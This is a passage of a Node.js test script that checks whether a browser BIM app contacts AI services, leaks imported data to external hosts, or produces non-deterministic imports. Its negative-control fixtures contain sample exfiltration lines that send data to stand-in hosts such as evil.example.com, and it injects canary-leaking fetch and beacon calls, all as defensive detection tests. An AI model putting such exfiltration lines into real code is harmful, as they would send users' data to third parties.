#!/usr/bin/env node
// ⚠ DO NOT REMOVE — scope + log rule.
// WITNESS — no_ai_inside: PROVES (or disproves) the user-guide guarantee
//   "There is no AI and no LLM in this app. Your data never leaves your browser ... nothing phones home,
//    and no model is fed your data. Every result is deterministic."   (bim-compiler docs/USER_GUIDE.md L9-13)
// Spec: bim-compiler prompts/NO_AI_INSIDE_WITNESS.md (read it first). READ THE LOG AFTER EVERY RUN —
//   exit code is not evidence; NO-OP / VACUOUS / WRONG / INCONCLUSIVE only appear in the log.
// A violation this witness finds is reported verbatim — NEVER allowlist it away to turn the run green.
//
// Three checks, one § line each:  §NOAI_STATIC (C1)  §NOAI_NETWORK (C2)  §NOAI_DETERMINISM (C3)
// then §NOAI_VERDICT.  Built on witness_kit/contract.js for C1 (population = scan set, redControl = fixture).
//
// HARD: NO GPU. Chromium is launched with software rendering only (--disable-gpu, swiftshader).
// Run:  node viewer/tests/witness_no_ai_inside.js 2>&1 | tee /tmp/noai_witness.log     (cwd = bim-ootb worktree)
'use strict';
const fs = require('fs'), os = require('os'), path = require('path'), http = require('http'), crypto = require('crypto');
const { execFileSync } = require('child_process');
const { Witness } = require('../../witness_kit/contract');

const ROOT = path.join(__dirname, '..', '..');
const sha = b => crypto.createHash('sha256').update(b).digest('hex');
const sleep = ms => new Promise(r => setTimeout(r, ms));

// ─────────────────────────────────────────────────────────────────────────────────────────────
// ALLOWLIST — every entry has a written reason; the whole table is PRINTED each run (never silent).
// Anything not here, not an XML namespace, not a comment/doc reference => UNLISTED => FAIL.
// Deliberately NOT here (task rule: do not hide): goatcounter / gc.zgo.at (analytics beacon),
// api.qrserver.com, tinyurl.com (payload-bearing third-party services), api.github.com.
const ALLOW = [
  { host: 'cdn.jsdelivr.net',      why: 'CDN GET of open-source code libs (sql.js wasm, three, chart.js); request carries no user data' },
  { host: 'cdnjs.cloudflare.com',  why: 'CDN GET of three.js r128 code; request carries no user data' },
  { host: 'unpkg.com',             why: 'CDN GET of web-ifc code (import_worker.js fallback after local lib/ fails); no user data' },
  { host: 'cdn.sheetjs.com',       why: 'CDN GET of SheetJS code (loader.js fallback); no user data' },
  { host: 'fonts.googleapis.com',  why: 'Google Fonts CSS GET (index.html); no user data, but leaks IP/User-Agent to Google — noted' },
  { host: 'objectstorage.ap-kulai-2.oraclecloud.com', why: 'OCI bucket: GET of the published sample-building DBs (PROD_BASE); no upload path' },
  { host: 'github.com', exact: true, why: 'user-initiated navigation links / repo zip href; the app issues no request, the USER navigates' },
  { host: 'red1oon.github.io',     why: 'same-project docs/sample links + sample xlsx GET on the project own Pages site' },
  { host: 'youtu.be',              why: 'user-initiated navigation link (openTab on click)' },
  { host: 'wa.me',                 why: 'user-clicked share link opened via window.open; user chooses to send' },
  { host: 'maps.google.com',       why: 'text in a user-initiated share message; not fetched by the app' },
  { host: 'gc.zgo.at', file: 'index.html', why: 'red1 2026-10-02: tracker on landing page only, not in the viewer' },
  { host: 'red1oon.goatcounter.com', file: 'index.html', why: 'red1 2026-10-02: tracker on landing page only, not in the viewer' },
  { host: 'raw.githubusercontent.com', file: 'erp/plugin_overlay.js', why: 'input placeholder TEXT only (plugin_overlay.js:417); the overlay fetches a URL the user types, on a user action' },
];
// PENDING red1 decision: user-triggered features that send data to a third party. Disclosed in the guide; NOT allowlisted.
// Own verdict tier (PASS_WITH_DISCLOSED when only these remain) — never plain PASS.
const PENDING = ['api.github.com', 'tinyurl.com', 'api.qrserver.com'];
const PENDING_WHY = 'PENDING red1 decision: user-triggered feature';
// XML-namespace / schema URIs — identifiers, never requested.
const NS_HOSTS = ['w3.org', 'openxmlformats.org', 'schemas.microsoft.com', 'purl.org', 'purl.oclc.org',
  'docs.oasis-open.org', 'openoffice.org', 'xmlns.oracle.com', 'idempiere.org', 'opengis.net', 'sheetjs.openxmlformats.org'];
// Documentation / licence references that appear inside vendored library files only.
const VENDOR_DOC_HOSTS = ['shadertoy.com', 'feross.org', 'd-project.com', 'denso-wave.com', 'activision.com',
  'opensource.org', 'jcgt.org', 'emscripten.org', 'cdrinmatane.github.io', 'stuk.github.io', 'researchgate.net',
  'blenderartists.org', 'simonwallner.at', 'stuartk.com', 'graphics.cornell.edu', 'knarkowicz.wordpress.com',
  'extremelearning.com.au', 'jsdelivr.com', 'stackoverflow.com', 'github.com', 'sheetjs.com', 'chartjs.org',
  'raw.github.com', 'google.com', 'wikipedia.org', 'khronos.org', 'mozilla.org', 'npmjs.com'];

const hostIn = (h, list) => list.some(x => h === x || h.endsWith('.' + x));
const allowFor = (h, file) => ALLOW.find(a => (h === a.host || (!a.exact && h.endsWith('.' + a.host))) && (!a.file || a.file === file));

// ─────────────────────────────────────────────────────────────────────────────────────────────
// C1 — static scanner
const LLM_HOSTS = [/api\.openai\.com/i, /openai\.azure\.com/i, /api\.anthropic\.com/i, /generativelanguage\.googleapis\.com/i,
  /aiplatform\.googleapis\.com/i, /huggingface\.co/i, /api-inference/i, /api\.cohere\./i, /api\.mistral\.ai/i, /openrouter\.ai/i,
  /api\.groq\.com/i, /api\.together\./i, /api\.replicate\.com/i, /api\.perplexity\.ai/i, /api\.x\.ai/i, /bedrock-runtime/i,
  /localhost:11434/i];
const LLM_SDK = [/from\s+['"]openai['"]/, /require\(\s*['"]openai['"]/, /@anthropic-ai/, /@xenova\/transformers/,
  /@huggingface\/transformers/, /transformers\.js/i, /onnxruntime/i, /InferenceSession\.create/, /loadGraphModel|loadLayersModel/,
  /web-llm|webllm|@mlc-ai/i, /\bwindow\.ai\b/, /LanguageModel\.create/, /chat\/completions/, /\/v1\/messages/, /anthropic-version/i,
  /\bwllama\b/i, /@mediapipe\/tasks-genai/];
const URL_RE = /(?:\b(?:https?|wss?):\/\/|(?<=["'`(=])\/\/(?=[a-z0-9-]+\.[a-z]))([a-z0-9-]+(?:\.[a-z0-9-]+)+)/gi;
const SINK_RE = /\bfetch\s*\(|XMLHttpRequest|new\s+WebSocket\s*\(|sendBeacon|new\s+EventSource\s*\(|importScripts\s*\(|\bimport\s*\(/g;
const isVendored = f => /\/lib\/|\.min\.js$|\/sqljs\/|sql-wasm/.test(f);
const isCommentLine = s => /^\s*(\/\/|\*|\/\*|<!--)/.test(s);

/** scanText(file, text) -> hit records {file,line,kind,detail,cls}. kind: LLM_HOST|LLM_SDK|EXT_URL|SINK_CENSUS */
function scanText(file, text) {
  const hits = [];
  const lines = text.split('\n');
  for (let i = 0; i < lines.length; i++) {
    const ln = lines[i];
    for (const re of LLM_HOSTS) { const m = ln.match(re); if (m) hits.push({ file, line: i + 1, kind: 'LLM_HOST', detail: m[0], cls: 'FORBIDDEN' }); }
    for (const re of LLM_SDK) { const m = ln.match(re); if (m) hits.push({ file, line: i + 1, kind: 'LLM_SDK', detail: m[0], cls: 'FORBIDDEN' }); }
    URL_RE.lastIndex = 0; let m;
    while ((m = URL_RE.exec(ln))) {
      const host = m[1].toLowerCase();
      let cls, why = '';
      if (hostIn(host, NS_HOSTS)) cls = 'NS';
      else if (allowFor(host, file)) { cls = 'ALLOW'; why = allowFor(host, file).host; }
      else if (hostIn(host, PENDING)) { cls = 'PENDING'; why = PENDING_WHY; }
      else if (isCommentLine(ln)) cls = 'COMMENT';
      else if (isVendored(file) && hostIn(host, VENDOR_DOC_HOSTS)) cls = 'VENDOR_DOC';
      else cls = 'UNLISTED';
      hits.push({ file, line: i + 1, kind: 'EXT_URL', detail: host + (why ? ' [' + why + ']' : ''), cls,
        ctx: cls === 'UNLISTED' ? ln.trim().slice(0, 160) : undefined });
    }
    SINK_RE.lastIndex = 0;
    if (!isCommentLine(ln) && !isVendored(file)) { let s; while ((s = SINK_RE.exec(ln))) hits.push({ file, line: i + 1, kind: 'SINK_CENSUS', detail: s[0].trim(), cls: 'INFO' }); }
  }
  return hits;
}

function shippedFiles() {
  const out = execFileSync('git', ['-C', ROOT, 'ls-files'], { maxBuffer: 1 << 28 }).toString().split('\n').filter(Boolean);
  return out.filter(f => (f === 'index.html' || /^(viewer|common|erp|modeller)\//.test(f))
    && /\.(js|html|json|mjs|webmanifest)$/.test(f)
    && !/\/tests?\/|\/fixtures\/|\/demo\/|poc|witness|\.spec\./.test(f));
}

/** scanRows(files:[{file,text}]) -> one row per file (witness_kit population shape) */
function scanRows(files) {
  return files.map(({ file, text }) => {
    const hits = scanText(file, text);
    return { file, bytes: Buffer.byteLength(text), llm: hits.filter(h => h.cls === 'FORBIDDEN').length,
      unlisted: hits.filter(h => h.cls === 'UNLISTED').length, pending: hits.filter(h => h.cls === 'PENDING').length, hits };
  });
}

// ─────────────────────────────────────────────────────────────────────────────────────────────
// C2 — request analysis (pure function, so the negative control exercises the SAME code)
function analyze(reqs, origin, markers) {
  const ext = new Map(), llm = [], leaks = [], unlistedOrigins = new Map(), pending = new Map(), perPage = new Map();
  for (const r of reqs) {
    let u; try { u = new URL(r.url); } catch (e) { continue; }
    if (!/^(https?|wss?):$/.test(u.protocol)) continue;
    // same-origin requests go to our own static server (the app's own URL may legitimately carry the file name):
    // only their BODY can be an upload. Cross-origin requests are checked in full (URL + body + headers incl. Referer).
    const blob = u.origin === origin ? (r.post || '') : r.url + '\n' + (r.post || '') + '\n' + JSON.stringify(r.headers || {});
    for (const re of LLM_HOSTS) if (re.test(u.host)) llm.push(r.url);
    for (const mk of markers) for (const enc of mk.forms) if (blob.includes(enc)) leaks.push({ url: r.url.slice(0, 120), marker: mk.name, form: enc.slice(0, 24) });
    if (u.origin !== origin) {
      ext.set(u.origin, (ext.get(u.origin) || 0) + 1);
      const pg = r.page || '(unknown)', k = pg + ' -> ' + u.origin;
      perPage.set(k, (perPage.get(k) || 0) + 1);
      if (hostIn(u.hostname, PENDING)) pending.set(u.origin, (pending.get(u.origin) || 0) + 1);
      else if (!allowFor(u.hostname, pg)) unlistedOrigins.set(k, (unlistedOrigins.get(k) || 0) + 1);
    }
  }
  return { ext, llm, leaks, unlistedOrigins, pending, perPage };
}
const forms = s => [s, encodeURIComponent(s), Buffer.from(s).toString('base64').replace(/=+$/, ''), Buffer.from(s).toString('hex')];

// ─────────────────────────────────────────────────────────────────────────────────────────────
const MIME = { '.html': 'text/html', '.js': 'text/javascript', '.mjs': 'text/javascript', '.json': 'application/json', '.wasm': 'application/wasm',
  '.css': 'text/css', '.png': 'image/png', '.svg': 'image/svg+xml', '.db': 'application/octet-stream', '.webmanifest': 'application/manifest+json' };
function startServer() {
  const server = http.createServer((req, res) => {
    let p = decodeURIComponent(req.url.split('?')[0]); if (p === '/') p = '/index.html';
    fs.readFile(path.join(ROOT, p), (e, buf) => {
      if (e) { res.writeHead(404); res.end('404'); return; }
      res.writeHead(200, { 'Content-Type': MIME[path.extname(p)] || 'application/octet-stream' }); res.end(buf);
    });
  });
  return new Promise(r => server.listen(0, '127.0.0.1', () => r(server)));
}

// One full user flow: fresh context, drop IFC on the hub, wait for import, let the viewer boot.
async function runImport(chromium, origin, ifcPath, tag, settleMs) {
  const browser = await chromium.launch({ headless: true,
    args: ['--disable-gpu', '--use-gl=swiftshader', '--use-angle=swiftshader', '--disable-gpu-compositing', '--no-sandbox'] });
  const context = await browser.newContext({ serviceWorkers: 'block' });
  const reqs = [], logs = [], wsFrames = [];
  context.on('request', r => {
    let pg = '(worker/unknown)';
    try { const f = r.frame(); const fu = r.isNavigationRequest() ? r.url() : f.url(); const pu = new URL(fu); pg = pu.pathname.replace(/^\//, '') || 'index.html'; } catch (e) {}
    reqs.push({ url: r.url(), method: r.method(), post: r.postData() || '', headers: r.headers(), page: pg });
  });
  context.route('**/*', route => {
    const u = route.request().url();
    if (u.startsWith(origin) || /^(data|blob):/.test(u)) return route.continue();
    return route.abort('blockedbyclient'); // recorded above; no real egress
  });
  const hook = p => { p.on('console', m => logs.push(m.text())); p.on('pageerror', e => logs.push('PAGEERR ' + e.message));
    p.on('websocket', ws => { ws.on('framesent', f => wsFrames.push({ url: ws.url(), post: String(f.payload) })); }); };
  context.on('page', hook);
  const page = await context.newPage();
  await page.goto(origin + '/index.html', { waitUntil: 'domcontentloaded', timeout: 60000 });
  await page.evaluate(() => { try { localStorage.setItem('mx_entered', '1'); } catch (e) {} });
  await page.evaluate(() => { if (typeof openHub === 'function') openHub(); });
  await sleep(500);
  const input = await page.$('#m-import-file');
  let done = '', err = '';
  if (input) {
    await input.setInputFiles(ifcPath);
    for (let i = 0; i < 60; i++) {
      done = logs.find(l => /§IMPORT_SAVED|§MULTI_IMPORT_DONE/.test(l)) || '';
      err = logs.find(l => /§MULTI_FILE_ERROR|§MULTI_DB_ERROR|§IMPORT_DB_ERROR/.test(l)) || '';
      if (done || err) break;
      await sleep(1000);
    }
    if (done) await sleep(settleMs); // let the auto-opened viewer boot and make its requests (kept short: software GL, no heavy work)
  }
  // read every persisted import record from IndexedDB (the importer's computed output)
  const records = await page.evaluate(async () => {
    const b64 = u8 => { let s = ''; const a = new Uint8Array(u8.buffer || u8, u8.byteOffset || 0, u8.byteLength); for (let i = 0; i < a.length; i += 0x8000) s += String.fromCharCode.apply(null, a.subarray(i, i + 0x8000)); return btoa(s); };
    const open = n => new Promise(res => { const r = indexedDB.open(n); r.onsuccess = () => res(r.result); r.onerror = () => res(null); });
    const db = await open('bim_ootb_imports'); if (!db || !db.objectStoreNames.contains('buildings')) return [];
    const all = await new Promise(res => { const out = []; const rq = db.transaction('buildings').objectStore('buildings').openCursor();
      rq.onsuccess = () => { const c = rq.result; if (c) { out.push({ key: String(c.key), val: c.value }); c.continue(); } else res(out); }; rq.onerror = () => res(out); });
    const conv = (v, depth) => {
      if (v instanceof ArrayBuffer || ArrayBuffer.isView(v)) return { __bytes: b64(v) };
      if (v && typeof v === 'object' && depth < 4) { const o = Array.isArray(v) ? [] : {}; for (const k of Object.keys(v)) o[k] = conv(v[k], depth + 1); return o; }
      return v;
    };
    return all.map(e => ({ key: e.key, val: conv(e.val, 0) }));
  }).catch(e => { logs.push('IDB_READ_ERR ' + e.message); return []; });
  const result = { tag, reqs, logs, wsFrames, done, err, records, context, browser, page };
  return result;
}

// collect {path:'a.b[0]', buf} for every __bytes leaf
function bytesLeaves(v, p, out) {
  if (v && typeof v === 'object') {
    if (typeof v.__bytes === 'string') out.push({ path: p, buf: Buffer.from(v.__bytes, 'base64') });
    else for (const k of Object.keys(v)) bytesLeaves(v[k], p + '.' + k, out);
  }
  return out;
}

// On a logical mismatch: list the first differing cells per differing table (so the verdict traces to measured values).
function cellDiffs(SQL, bufA, bufB, tables) {
  const out = []; out.total = 0; out.nonTimestamp = 0;
  const TS = /^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(\.\d+)?Z?$/;
  const dbA = new SQL.Database(new Uint8Array(bufA)), dbB = new SQL.Database(new Uint8Array(bufB));
  for (const t of tables) {
    const qa = dbA.exec('SELECT rowid, * FROM "' + t + '" ORDER BY rowid')[0], qb = dbB.exec('SELECT rowid, * FROM "' + t + '" ORDER BY rowid')[0];
    if (!qa || !qb) { out.push(t + ': rows A=' + (qa ? qa.values.length : 0) + ' B=' + (qb ? qb.values.length : 0)); continue; }
    let n = 0;
    for (let i = 0; i < Math.max(qa.values.length, qb.values.length); i++) {
      const ra = qa.values[i] || [], rb = qb.values[i] || [];
      for (let c = 0; c < qa.columns.length; c++) if (JSON.stringify(ra[c]) !== JSON.stringify(rb[c])) { out.total++; if (!(TS.test(String(ra[c])) && TS.test(String(rb[c])))) out.nonTimestamp++; if (n < 5) out.push(t + ' rowid=' + ra[0] + ' col=' + qa.columns[c] + ' A=' + JSON.stringify(ra[c]).slice(0, 60) + ' B=' + JSON.stringify(rb[c]).slice(0, 60)); n++; }
    }
  }
  dbA.close(); dbB.close(); return out;
}

const TS_MASK = /^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(\.\d+)?Z?$/;
async function logicalHash(SQL, buf) {
  let masked = 0;
  let db; try { db = new SQL.Database(new Uint8Array(buf)); } catch (e) { return null; }
  const h = crypto.createHash('sha256'); const per = {}; let rows = 0;
  let tables; try { tables = db.exec("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name"); } catch (e) { db.close(); return null; }
  for (const t of (tables[0] ? tables[0].values.map(r => r[0]) : [])) {
    const th = crypto.createHash('sha256'); let n = 0;
    let q; try { q = db.exec('SELECT * FROM "' + t + '" ORDER BY rowid'); } catch (e) { try { q = db.exec('SELECT * FROM "' + t + '"'); } catch (e2) { q = []; } }
    for (const r of (q[0] ? q[0].values : [])) { th.update(JSON.stringify(r.map(c => (typeof c === 'string' && TS_MASK.test(c)) ? (masked++, '<TS>') : c)) + '\n'); n++; }
    per[t] = { rows: n, hash: th.digest('hex') }; rows += n; h.update(t + ':' + per[t].hash + '\n');
  }
  db.close();
  return { hash: h.digest('hex'), per, rows, masked };
}

(async () => {
  const verdicts = {};
  console.log('§NOAI_START root=' + ROOT + ' node=' + process.version);

  // ═══ C1 STATIC ═══
  const files = shippedFiles().map(f => ({ file: f, text: fs.readFileSync(path.join(ROOT, f), 'utf8') }));
  const rows = scanRows(files);
  const bytes = rows.reduce((a, r) => a + r.bytes, 0);
  console.log('§NOAI_BOUNDARY files=' + files.length + ' bytes=' + bytes + ' (index.html + tracked viewer/ common/ erp/ modeller/ js|html|json|mjs|webmanifest, minus tests/fixtures/demo/poc/witness/spec)');
  console.log('§NOAI_ALLOWLIST ' + ALLOW.length + ' external hosts, each with its reason:');
  ALLOW.forEach(a => console.log('  ALLOW ' + a.host + ' — ' + a.why));
  console.log('  NS (XML namespace ids, never requested): ' + NS_HOSTS.join(', '));
  console.log('  VENDOR_DOC (doc/licence refs inside vendored libs only): ' + VENDOR_DOC_HOSTS.join(', '));
  const allHits = rows.flatMap(r => r.hits);
  const by = c => allHits.filter(h => h.cls === c);
  const llmHits = by('FORBIDDEN'), unl = by('UNLISTED'), pend = by('PENDING');
  // each ALLOWed host actually seen, enumerated with count and first sites
  const seen = new Map();
  by('ALLOW').forEach(h => { const k = h.detail; if (!seen.has(k)) seen.set(k, []); seen.get(k).push(h.file + ':' + h.line); });
  console.log('§NOAI_ALLOWED_SEEN');
  [...seen].sort().forEach(([k, v]) => console.log('  ' + k + ' x' + v.length + ' first=' + v.slice(0, 3).join(' ')));
  pend.forEach(h => console.log('§NOAI_HIT PENDING ' + h.file + ':' + h.line + ' host=' + h.detail));
  llmHits.forEach(h => console.log('§NOAI_HIT LLM ' + h.kind + ' ' + h.file + ':' + h.line + ' ' + h.detail));
  unl.forEach(h => console.log('§NOAI_HIT UNLISTED_EXTERNAL ' + h.file + ':' + h.line + ' host=' + h.detail + ' :: ' + h.ctx));
  const census = {}; by('INFO').forEach(h => { census[h.detail] = (census[h.detail] || 0) + 1; });
  console.log('§NOAI_SINK_CENSUS (non-vendored call sites; target resolved dynamically by C2) ' + JSON.stringify(census));

  // negative control: synthetic fixture with every forbidden shape — the SAME scanText must catch each
  const fixDir = fs.mkdtempSync(path.join(os.tmpdir(), 'noai_fix_'));
  const fixture = [
    "const r = await fetch('https://api.openai.com/v1/chat/completions', {method:'POST'});",
    "import Anthropic from '@anthropic-ai/sdk';",
    "fetch('https://evil.example.com/x?d=' + data);",
    "navigator.sendBeacon('//track.evil.example.net/b', blob);",
    "const w = new WebSocket('wss://evil.example.com/ws');",
  ].join('\n');
  fs.writeFileSync(path.join(fixDir, 'fixture.js'), fixture);
  const fh = scanText('fixture.js', fs.readFileSync(path.join(fixDir, 'fixture.js'), 'utf8'));
  const need = { openai_host: fh.some(h => h.kind === 'LLM_HOST' && /openai/.test(h.detail)),
    anthropic_sdk: fh.some(h => h.kind === 'LLM_SDK' && /anthropic/.test(h.detail)),
    external_fetch: fh.some(h => h.cls === 'UNLISTED' && h.detail === 'evil.example.com'),
    beacon_protocol_relative: fh.some(h => h.cls === 'UNLISTED' && h.detail === 'track.evil.example.net'),
    websocket: fh.some(h => h.cls === 'UNLISTED' && h.line === 5) };
  const negC1 = Object.values(need).every(Boolean);
  console.log('§NOAI_STATIC_NEGCTL fixture=' + fixDir + '/fixture.js caught=' + JSON.stringify(need) + ' => ' + (negC1 ? 'caught' : 'WRONG'));

  // witness_kit run: population = scan set; invariants = no LLM, no unlisted external; redControl = fixture rows
  const schema = { type: 'object', required: ['file', 'bytes', 'llm', 'unlisted'],
    properties: { file: { type: 'string' }, bytes: { type: 'integer', minimum: 1 }, llm: { type: 'integer' }, unlisted: { type: 'integer' } } };
  const kit = Witness('no_ai_inside_static').population(() => rows).schema(schema)
    .invariant('no-llm-host-or-sdk', rs => rs.every(r => r.llm === 0))
    .invariant('no-unlisted-external-host', rs => rs.every(r => r.unlisted === 0))
    .redControl(() => scanRows([{ file: 'fixture.js', text: fixture }]).map(r => ({ file: r.file, bytes: r.bytes, llm: r.llm, unlisted: r.unlisted })))
    .run();
  let v1;
  if (files.length === 0 || bytes === 0) v1 = 'VACUOUS';
  else if (!negC1) v1 = 'WRONG';
  else if (allHits.filter(h => h.kind === 'EXT_URL').length === 0) v1 = 'NO-OP';
  else v1 = (llmHits.length || unl.length) ? 'FAIL' : pend.length ? 'PASS_WITH_DISCLOSED' : 'PASS';
  verdicts.C1 = v1;
  console.log('§NOAI_STATIC verdict=' + v1 + ' files=' + files.length + ' bytes=' + bytes + ' llm_hits=' + llmHits.length +
    ' unlisted=' + unl.length + ' pending_disclosed=' + pend.length + ' allow_hosts_seen=' + seen.size + ' ext_urls=' + allHits.filter(h => h.kind === 'EXT_URL').length + ' negctl=' + (negC1 ? 'caught' : 'WRONG') +
    ' kit_fail=' + kit.fail);

  // ═══ C2 NETWORK + C3 DETERMINISM (browser) ═══
  const PW = process.env.PW || path.join(os.homedir(), 'bim-ootb/tests/node_modules/playwright');
  const { chromium } = require(PW);
  const server = await startServer();
  const origin = 'http://127.0.0.1:' + server.address().port;
  const SRC = process.env.NOAI_IFC || path.join(ROOT, 'IFC/SampleHouse_ARC.ifc');
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'noai_ifc_'));
  const CANARY = 'CANARY_' + crypto.randomBytes(8).toString('hex');
  const srcText = fs.readFileSync(SRC, 'utf8');
  const sigM = (srcText.slice(srcText.indexOf('DATA;')).match(/'([A-Za-z0-9 _:.-]{24,60})'/g) || []).map(x => [x.slice(1, -1)]).find(x => !/Pset|IFC|^[A-Za-z0-9$_]{22}$/.test(x[0])); // a distinctive real content string from the file body
  const CONTENT_SIG = sigM ? sigM[0] : null;
  const canaryText = srcText.replace(/IFCPROJECT\('([^']*)',#(\d+),'([^']*)',\$,\$,'([^']*)'/, (m, g, o, n, l) => "IFCPROJECT('" + g + "',#" + o + ",'" + CANARY + "_NAME',$,$,'" + CANARY + "_LONG'");
  const canaryInContent = canaryText.includes(CANARY);
  const canaryPath = path.join(tmp, CANARY + '_Sensor.ifc');
  fs.writeFileSync(canaryPath, canaryText);
  console.log('§NOAI_C2_SETUP src=' + path.relative(ROOT, SRC) + ' canary=' + CANARY + ' canary_in_file_content=' + canaryInContent + ' content_sig=' + CONTENT_SIG + ' origin=' + origin);

  const markers = [{ name: 'canary', forms: forms(CANARY) }];
  if (CONTENT_SIG) markers.push({ name: 'content_sig', forms: forms(CONTENT_SIG) });

  let runA;
  try { runA = await runImport(chromium, origin, canaryPath, 'canary', 8000); } catch (e) { console.log('§NOAI_C2_ERROR ' + e.message); }
  let v2 = 'INCONCLUSIVE', negC2 = false;
  if (runA) {
    const importOk = !!runA.done;
    console.log('§NOAI_C2_IMPORT done=' + (runA.done || 'NONE') + ' err=' + (runA.err || 'none') + ' records=' + runA.records.length);
    const nonOrigin = r => { try { return new URL(r.url).origin !== origin; } catch (e) { return false; } };
    const mainReqs = runA.reqs.slice();
    const a = analyze(mainReqs.concat(runA.wsFrames.map(f => ({ url: f.url, post: f.post }))), origin, markers);
    console.log('§NOAI_C2_REQUESTS total=' + mainReqs.length + ' same_origin=' + mainReqs.filter(r => !nonOrigin(r) && /^http/.test(r.url)).length + ' external=' + mainReqs.filter(nonOrigin).filter(r => /^https?:|^wss?:/.test(r.url)).length + ' ws_frames_sent=' + runA.wsFrames.length);
    console.log('§NOAI_PER_PAGE_ORIGINS (page that made the request -> external origin: count)');
    [...a.perPage].sort().forEach(([k, n]) => console.log('  ' + k + ' x' + n + ' ' + (a.unlistedOrigins.has(k) ? 'NOT-ALLOWLISTED' : 'allowed-for-this-page')));
    const gcHosts = r => /(^|\.)(gc\.zgo\.at|red1oon\.goatcounter\.com)$/.test(new URL(r.url).hostname);
    const gcViewer = mainReqs.filter(r => gcHosts(r) && /^viewer\/viewer\.html/.test(r.page));
    const gcLanding = mainReqs.filter(r => gcHosts(r) && r.page === 'index.html');
    console.log('§NOAI_GOATCOUNTER from_viewer.html=' + gcViewer.length + ' from_index.html=' + gcLanding.length + ' (index.html allowed: red1 2026-10-02: tracker on landing page only, not in the viewer)');
    const viewerSeen = mainReqs.some(r => /^viewer\/viewer\.html/.test(r.page));
    console.log('§NOAI_VIEWER_PAGE_SEEN ' + viewerSeen + ' (if false, the viewer-side assertion is vacuous)');
    mainReqs.filter(r => { try { const u = new URL(r.url); return u.origin !== origin && !hostIn(u.hostname, PENDING) && !allowFor(u.hostname, r.page); } catch (e) { return false; } }).forEach(r =>
      console.log('§NOAI_HIT NETWORK_UNLISTED page=' + r.page + ' ' + r.method + ' ' + r.url.slice(0, 200) + (r.post ? ' body_bytes=' + r.post.length : '')));
    a.llm.forEach(u => console.log('§NOAI_HIT NETWORK_LLM ' + u));
    a.leaks.forEach(l => console.log('§NOAI_HIT NETWORK_CANARY_LEAK marker=' + l.marker + ' url=' + l.url));

    // negative control: inject a canary leak + external call in the live page, analyze with the SAME function
    const before = runA.reqs.length;
    const page = runA.page;
    await page.evaluate(async c => {
      try { await fetch('https://canary-sink.invalid/?x=' + c).catch(() => {}); } catch (e) {}
      try { await fetch('https://canary-sink.invalid/p', { method: 'POST', body: c }).catch(() => {}); } catch (e) {}
      try { navigator.sendBeacon('https://canary-sink.invalid/b', c); } catch (e) {}
    }, CANARY);
    await sleep(1500);
    const injected = runA.reqs.slice(before);
    const n = analyze(injected, origin, markers);
    negC2 = injected.length >= 2 && [...n.unlistedOrigins.keys()].some(k => k.endsWith('https://canary-sink.invalid')) && n.leaks.length >= 2;
    console.log('§NOAI_NETWORK_NEGCTL injected_requests=' + injected.length + ' flagged_origin=' + [...n.unlistedOrigins.keys()].some(k => k.endsWith('https://canary-sink.invalid')) + ' flagged_leaks=' + n.leaks.length + ' => ' + (negC2 ? 'caught' : 'WRONG'));

    if (mainReqs.length === 0) v2 = 'VACUOUS';
    else if (!negC2) v2 = 'WRONG';
    else if (!importOk || !canaryInContent) v2 = 'INCONCLUSIVE'; // canary never entered the app => absence of leak proves nothing
    else if (!viewerSeen) v2 = 'INCONCLUSIVE';
    else v2 = (a.llm.length || a.leaks.length || a.unlistedOrigins.size || gcViewer.length) ? 'FAIL' : a.pending.size ? 'PASS_WITH_DISCLOSED' : 'PASS';
    console.log('§NOAI_NETWORK verdict=' + v2 + ' requests=' + mainReqs.length + ' external_origins=' + JSON.stringify([...a.ext.keys()].sort()) +
      ' unlisted_page_origins=' + JSON.stringify([...a.unlistedOrigins.keys()]) + ' goatcounter_from_viewer=' + gcViewer.length + ' canary_leaks=' + a.leaks.length + ' llm_hits=' + a.llm.length +
      ' import_done=' + importOk + ' negctl=' + (negC2 ? 'caught' : 'WRONG'));
    await runA.browser.close();
  } else console.log('§NOAI_NETWORK verdict=INCONCLUSIVE reason=run_failed');
  verdicts.C2 = v2;

  // ═══ C3 DETERMINISM ═══
  let v3 = 'INCONCLUSIVE', negC3 = false;
  try {
    const plain = path.join(tmp, 'Sensor_plain.ifc'); fs.copyFileSync(SRC, plain);
    const SQL = await require(path.join(ROOT, 'node_modules/sql.js'))();
    const R = [];
    for (const t of ['A', 'B']) {
      const r = await runImport(chromium, origin, plain, 'det' + t, 500);
      const leaves = r.records.flatMap(rec => bytesLeaves(rec.val, rec.key, []));
      const em = (r.done.match(/elements=(\d+)/) || [])[1] || null;
      const lh = []; for (const l of leaves) { const h = await logicalHash(SQL, l.buf); lh.push({ path: l.path, bytes: sha(l.buf), blen: l.buf.length, logical: h, buf: l.buf }); }
      console.log('§NOAI_C3_RUN ' + t + ' done=' + (r.done ? 'yes' : 'NO') + ' err=' + (r.err || 'none') + ' elements=' + em + ' byte_leaves=' + leaves.length + ' ' +
        lh.map(x => x.path + ' len=' + x.blen + ' rows=' + (x.logical ? x.logical.rows : 'notsqlite')).join(' | '));
      R.push({ done: !!r.done, em, lh }); await r.browser.close();
    }
    const [A, B] = R;
    const rowsA = A.lh.reduce((s, x) => s + (x.logical ? x.logical.rows : 0), 0);
    if (!A.done || !B.done) v3 = 'INCONCLUSIVE';
    else if (rowsA === 0) v3 = 'VACUOUS';
    else {
      const maskedA = A.lh.reduce((s2, x) => s2 + (x.logical ? x.logical.masked : 0), 0), maskedB = B.lh.reduce((s2, x) => s2 + (x.logical ? x.logical.masked : 0), 0);
      console.log('§NOAI_C3_MASK masked_cells A=' + maskedA + ' B=' + maskedB + ' — masked ONLY string cells shaped like an ISO-8601 timestamp (YYYY-MM-DDTHH:MM:SS[.fff][Z]) = import wall-clock stamps; every other cell is hashed');
      let logicalEq = A.lh.length === B.lh.length, bytesEq = logicalEq, firstDiff = '';
      A.lh.forEach((x, i) => { const y = B.lh[i]; if (!y) { logicalEq = bytesEq = false; return; }
        if (x.path !== y.path) { logicalEq = false; firstDiff = firstDiff || 'leaf path ' + x.path + ' vs ' + y.path; }
        const lx = x.logical && x.logical.hash, ly = y.logical && y.logical.hash;
        if (lx !== ly) { logicalEq = false;
